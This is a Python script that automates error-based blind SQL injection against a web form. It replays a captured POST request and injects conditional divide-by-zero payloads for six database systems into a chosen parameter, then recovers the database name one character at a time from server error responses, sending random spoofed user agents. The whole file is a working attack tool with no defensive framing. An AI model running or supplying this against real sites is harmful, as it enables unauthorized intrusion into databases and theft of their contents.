import argparse, sys, os, requests, string, urllib.parse
from fake_useragent import UserAgent



ua = UserAgent()
user_agent = ua.random 
LETTERS = string.ascii_lowercase + ''.join(map(str, range(10))) + '_'

def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--file', type=str, required=True, help='URL.')
    parser.add_argument('-p', '--param', type=str, required=True, help='Vulnrable Parameter.')
    parser.add_argument('--dbms', type=str, default='MSSQL', help='SQL System.')
    parser.add_argument('--prefix', type=str, default='', help='Prefix to use in the payload.')
    args = parser.parse_args()
    return args
def get_payload(key: str, index: int, char: str) -> str:
    payloads = {
        "MSSQL": r" AND (CASE WHEN SUBSTRING(DB_NAME(),X,1)='Y' THEN 1/0 ELSE 0 END=1)--",
        "MYSQL": r" AND IF(SUBSTRING(DATABASE(),X,1)='Y',1/0,0)=1",
        "ORACLE": r" AND CASE WHEN SUBSTR(USER,X,1)='Y' THEN 1/0 ELSE 0 END=1",
        "POSTGRESQL": r" AND CASE WHEN SUBSTRING(current_database(),X,1)='Y' THEN 1/0 ELSE 0 END=1",
        "SQLITE": r" AND CASE WHEN substr(database(),X,1)='Y' THEN 1/0 ELSE 0 END=1",
        "MARIADB": r" AND IF(SUBSTRING(DATABASE(),X,1)='Y',1/0,0)=1",
    }

    payload = payloads.get(key)
    if not payload: print_exit("Database não encontrado")
    return payload.replace("X", str(index)).replace("Y", char)

def print_exit(str):
    print(str)
    sys.exit(1)

def get_file(file):
    with open(file, 'r', encoding='utf-8') as f:
        return f.readlines()
    
def parse_form_data(form_data: str) -> dict:
    return dict(urllib.parse.parse_qsl(form_data))

def parse_file(file, param: str) -> dict:
    data = {
        "Method": None,
        "Host": None,
        "Cookie": None,
        "Path": None,
        "body": None,
    }

    if file[-2].strip(): print_exit("Error: Body is null")
    data["body"] = file[-1].strip()

    for line in file:
        if not data["Method"]:
            data["Method"] = line.split()[0]
        if not data["Path"]:
            data["Path"] = line.split()[1]
        if line.lower().startswith("host:"):
            data["Host"] = line.split(":", 1)[1].strip()
        if line.lower().startswith("cookie:"):
            data["Cookie"] = line.split(":", 1)[1].strip()

    if data["Method"] != 'POST': print_exit("Error: Method not supported")
    if not f'{param}=' in data["body"]: print_exit(f"Error: Parameter '{param}' not found in body.")
    return data

def validate_ssl(file) -> str:
    for line in file:
        if line.lower().startswith("origin:"):
            origin = line.split(":", 1)[1].strip()
            if origin.startswith('https'):
                return 'https'
            return 'http'

def make_original_request(data: dict, ssl: str) -> int:
    url = f'{ssl}://{data["Host"]}{data["Path"]}'

    headers = {
        "Cookie": data["Cookie"],
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": user_agent,
    }
    
    body = parse_form_data(data["body"])
    res = requests.post(url, headers=headers, data=body)

    if res.status_code != 200:
        print_exit(f"Error: Request failed. Status code: {res.status_code}")
    return len(res.content)

def make_malicious_request(data: dict, ssl: str, sql_key: str, res_original_length: int, prefix) -> None:
    url = f'{ssl}://{data["Host"]}{data["Path"]}'
    headers = {
        "Cookie": data["Cookie"],
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": user_agent,
    }
    
    body = parse_form_data(data["body"])

    dbname = []
    for index in range(1, 11):
        for char in LETTERS:
            payload = get_payload(sql_key, index, char)
            body[f'{args.param}'] = prefix + payload if prefix else payload
            res = requests.post(url, headers=headers, data=body)
            if res.status_code == 500 and len(res.content) != res_original_length:
                dbname.append(char)
                print(f"Letter {char} found in index {index}")
                break
            if char == LETTERS[-1] and len(dbname):
                print(f"Database Name:",''.join(dbname))
            elif char == LETTERS[-1]:
                print_exit('Error, no letters were found')
def main(args):
    if not os.path.isfile(args.file):
        print_exit(f"Error: File '{args.file}' not found.")
    file_content = get_file(args.file)
    data = parse_file(file_content, args.param)
    ssl =validate_ssl(file_content)
    res_length = make_original_request(data, ssl)
    make_malicious_request(data, ssl, args.dbms, res_length, args.prefix)

if __name__ == "__main__":
    args = arg_parser()
    main(args)
    